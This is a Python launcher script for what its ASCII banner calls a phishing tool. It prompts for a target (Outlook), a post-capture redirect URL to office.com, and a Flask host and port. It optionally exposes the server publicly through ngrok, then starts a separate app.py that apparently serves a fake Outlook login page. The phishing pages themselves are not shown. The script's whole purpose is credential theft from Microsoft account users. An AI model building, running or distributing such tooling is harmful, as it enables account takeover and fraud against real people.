import os
text= """      
                                                                              NN                                                     
                                                                            NssdN  N                                                 
                                                                            hsym  mmmmNN                                             
                                                                            ysym  mmNN  NmmNN                                        
                                                                            ysym  mN  NN  mdmmmNN                                    
                                                                            ysym  mN  N   mdddddmmmNN                                
                                                                         N  ysym   mmNNNmmddddmNNmddmmmN    myyyd                    
                                                                     N  Nm  yshm   NmdddddddmmNN  mddddddmN Nd+`/dN                  
                                                                    NNNNNN  dhdm    mdddddddN  mN  mdddsssyhmN mo--N                 
                                                                      myssh  NN  yN NdddddddN  mmN  mddhsssssydN Nyyhdm              
                                                                       my/.:shhs:`N Nmmmmmmm   mmm  NmdddysssssydN No.h              
                                                                          Nh+-    y  NNNNNN   NmddN  mdddddysssssymN h:od            
                                                                             Ndo-`:NN       NNmmmN   mdddddddhyssshmN m:-N           
                                                                                NdmmmmmNN           Nmddddddddddhyddmm Nhd           
                                                                                  NmmmmmmmNNNNNNN  Nmmddddddddddddyyydm  hy          
                                                                                   NNNNNNNNNNNN  dmNmmmmmmmmmdddddysshdmN N          
                                                                                         NNNNNdy/+m   NNNNN NmdddddhydddmN           
                                                                                        m/::--.`y  NN Nhs+/y  mddddddddddm           
                                                                                         mdo`   :d d//shmNmN Nddddddddddddm          
                                                                                            h-   `sNNhsohN  NmdddddddddddddN         
                                                                                             Ns.   -/syyyosN NmmdddddddddddN  N      
                                                                                              NNs-   ````` .sm NNmmmdddddddm  +d     
                                                                                              ysmNh/`        `/sdN Nmddddddm  :`y    
                                                                                              N:.y  my/.`        .s  mdddddm  / `d   
                                                                                               NoN     Nhs/.`      ymmdddddm  /` /   
                                                                                                            mh-   `-+NNNmddm  -` -   
                                                                                                         NmNNNhoohm NN  mddN m`  /   
                                                                                                          mmNN  m  m-N Nddm  /` -m   
                                                                                                          NN   d/  -o  mdm  d+ohN    
                                                                                                            d  +y h d Nmm            
                                                                                                           o   /d s`m NN             
                                                                                                          m. d yy d`o                
                                                                                                        Nh m:/  y  yN                
                                                                                                        s:sN hy                      
                                                                                        NdN           N                              
                                                                                         do/+oossyydm                                
                       
                 _____ _                                                    _                           _                 _       _               _     _     _     _               _              _ 
                |_   _| |                               ___                | |                         | |               | |     | |             | |   (_)   | |   (_)             | |            | |
                  | | | |__   ___    ___  _ __   ___   ( _ )     ___  _ __ | |_   _   _   _ _ __ ______| |_ ___ ______ __| | __ _| |_ ___   _ __ | |__  _ ___| |__  _ _ __   __ _  | |_ ___   ___ | |
                  | | | '_ \ / _ \  / _ \| '_ \ / _ \  / _ \/\  / _ \| '_ \| | | | | | | | | '_ \______| __/ _ \______/ _` |/ _` | __/ _ \ | '_ \| '_ \| / __| '_ \| | '_ \ / _` | | __/ _ \ / _ \| |
                  | | | | | |  __/ | (_) | | | |  __/ | (_>  < | (_) | | | | | |_| | | |_| | |_) |     | || (_) |    | (_| | (_| | ||  __/ | |_) | | | | \__ \ | | | | | | | (_| | | || (_) | (_) | |
                  \_/ |_| |_|\___|  \___/|_| |_|\___|  \___/\/  \___/|_| |_|_|\__, |  \__,_| .__/       \__\___/      \__,_|\__,_|\__\___| | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |  \__\___/ \___/|_|
                                                                               __/ |       | |                                             | |                               __/ |                   
                                                                              |___/        |_|                                             |_|                              |___/                    
Made by aarav2you
Made by Kritagyaispro                                               
"""
print(text)
windows = False
Mac = False
Linux= False
from sys import platform
if platform == "linux" or platform == "linux2":
    Linux= True
elif platform == "darwin":
    Mac = True
elif platform == "win32":
    Windows= True
print("[1] Outlook")
print("\n")
side = int(input("[*] Choose an option: "))


url = input("[*] Enter redirect URL (https://www.office.com/?auth=2): ")
if url=="":
    url = "https://www.office.com/?auth=2"

host= input("[*] Flask server host (localhost): ")
if host=="":
    host="localhost"

port=  input("[*] Flask server port (80): ")
if port=="":
    port=80
else:
    port=int(port)
ngrok = input("[*] Uee ngrok [y/n]: ")
if ngrok == "":
    ngrok="n"
from threading import Thread
def start_ngrok(port):
    os.system(f"ngrok http {port}")



def exec(side):
    if side==1:
        if Linux == True or Mac==True:
            
         # Change python version here if you want
            os.system(f"clear && python Sites/Linux/Outlook/app.py {url} {host} {port}")

        # Change python version here if you want
        else:
            os.system(f"cls && python Sites\\Windows\\Outlook\\app.py {url} {host} {port}")

b = Thread(target=exec, args=(side, ))
b.start()
if ngrok=="y":
    d=  Thread(target=start_ngrok, args=(port,))
    d.start()
